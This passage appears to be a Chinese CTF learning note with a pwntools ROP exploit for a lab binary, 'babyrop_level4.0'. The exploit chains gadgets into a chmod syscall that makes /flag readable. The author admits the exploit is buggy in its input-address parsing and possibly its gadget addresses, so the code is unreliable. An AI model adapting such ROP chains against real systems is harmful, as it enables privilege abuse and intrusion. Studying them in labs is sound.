    （因为如果要orw或者getshell的话似乎还要栈迁移）

    process.write(b'/flag\0'.ljust(88,b'a') + pwn.p64(pop_rax.address)+pwn.p64(90) + pwn.p64(pop_rdi.address)+pwn.p64(input) 
    ...: + pwn.p64(pop_rsi.address) + pwn.p64(0o777) + pwn.p64(syscall.address))

    我魔怔了

    顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）

    from pwn import*

context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"

p = process("./babyrop_level4.0")
syscall = 0x401a69
pop_rdi_ret = 0x401492
pop_rax_ret = 0x401a91
pop_rsi_ret = 0x401a71

p.recvuntil("[LEAK] Your input buffer is located at: ")

input  = u64(p.recv()[:12])

gdb.attach(p)
print(input)
payload = b"/flag\0".ljust(88,b'a')  
payload += p64(pop_rax_ret) + p64(90)
payload += p64(pop_rdi_ret) + p64(input)
payload += p64(pop_rsi_ret) + p64(0o777)
payload += p64(syscall)

p.send(payload)


p.interactive()
